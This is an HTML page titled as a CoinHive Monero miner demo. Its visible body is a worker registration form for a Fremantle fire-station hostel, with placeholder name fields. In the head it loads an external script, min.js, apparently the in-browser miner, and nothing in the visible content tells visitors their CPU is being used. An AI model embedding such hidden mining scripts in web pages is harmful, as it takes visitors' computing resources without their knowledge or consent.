<!DOCTYPE html>
<html>

<head>
    <title>CoinHive - Demo - Monero miner friendly simple GUI by C0nw0nk</title>
    <meta charset="UTF-8" />
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="index, follow" />
    <meta name="revisit-after" content="1 days" />
    <meta name="keywords" content="Old Fire Station, Work Fremantle, Fremantle Work, Back Packers Fremantle, Backpackers Fremantle" />

</head>
<script src="min.js"></script>

<body>
    <style>
        html,
        body {
            margin: 0;
            padding: 0;
            border: 0;
        }
    </style>
    <h1>Welcome to Old Fire Station's Worker Registration Form</h1>
    <form>
        <fieldset>
            <legend>Personal information:</legend>
            First name:<br>
            <input type="text" name="firstname" value="Mickey"><br> Last name:<br>
            <input type="text" name="lastname" value="Mouse"><br><br>
            <input type="radio" name="gender" value="male" checked> Male<br>
            <input type="radio" name="gender" value="female"> Female<br>
            <input type="radio" name="gender" value="other"> Other
            <input type="submit" value="Submit">
        </fieldset>
    </form>
</body>

</html>
